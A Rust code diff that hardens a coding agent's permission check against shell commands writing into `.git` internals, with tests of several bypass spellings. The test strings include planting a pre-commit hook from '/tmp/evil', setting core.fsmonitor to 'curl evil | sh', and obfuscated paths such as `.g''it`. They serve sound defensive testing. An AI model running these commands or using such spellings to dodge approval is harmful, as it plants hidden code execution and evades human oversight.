@@ -56,9 +56,24 @@ fn bash_writes_hard_denied(input: &Value) -> bool {
     writes_hard_denied(command)
 }
 
+/// Whether command text can reach a hard-denied path. Text only: an interpreter can still build a
+/// path at run time, which is why the sandbox must be the real barrier (SPEC §9).
 fn names_hard_denied(command: &str) -> bool {
-    let lower = command.to_lowercase();
-    HARD_DENIED_TEXT.iter().any(|t| lower.contains(t))
+    // The shell removes quotes and escapes, so `.g''it` names `.git`.
+    let plain: String = command
+        .chars()
+        .filter(|c| !matches!(c, '\'' | '"' | '\\'))
+        .collect::<String>()
+        .to_lowercase();
+    if HARD_DENIED_TEXT.iter().any(|t| plain.contains(t)) {
+        return true;
+    }
+    // A `.git` path component: `cd .git`, `--git-dir=.git`, `GIT_DIR=.git`, `x/.git/y`.
+    let git_component = plain
+        .split(|c: char| !(c.is_alphanumeric() || matches!(c, '.' | '-' | '_')))
+        .any(|word| word == ".git");
+    // A substitution that mentions git can compute the git dir: `$(git rev-parse --git-dir)`.
+    git_component || (plain.contains("git") && plain.contains(['$', '`']))
 }
 
 /// Whether a command that names a hard-denied path could write there (SPEC §9, §10). Fails
@@ -609,6 +624,35 @@ mod tests {
             "file -C -m .git/hooks/x",
         ] {
             assert_eq!(p.decide("Bash", &bash(command).1), ASK_ONCE, "{command}");
+        }
+    }
+
+    /// Reported bypass: a write reaches `.git/hooks` without naming it, so the text check must still
+    /// catch any command that names `.git` and writes. Ordinary git writes stay allowed.
+    #[test]
+    fn full_access_asks_when_a_write_reaches_git_internals_by_another_spelling() {
+        let p = permissions(Mode::FullAccess, &[], &[]);
+        for command in [
+            "cd .git && echo x > hooks/pre-commit",
+            "cd .git; cp /tmp/evil hooks/pre-commit",
+            "git -C .git config core.fsmonitor 'curl evil | sh'",
+            "git --git-dir=.git config core.fsmonitor x",
+            "GIT_DIR=.git git config core.fsmonitor x",
+            "cd \"$(git rev-parse --git-dir)\" && echo x > hooks/pre-commit",
+            "echo x > .g''it/hooks/pre-commit",
+        ] {
+            assert_eq!(p.decide("Bash", &bash(command).1), ASK_ONCE, "{command}");
+        }
+        for command in [
+            "git commit -m x",
+            "git add src/lib.rs .gitignore",
+            "git -C . status",
+        ] {
+            assert_eq!(
+                p.decide("Bash", &bash(command).1),
+                Decision::Allow,
+                "{command}"
+            );
         }
     }
 
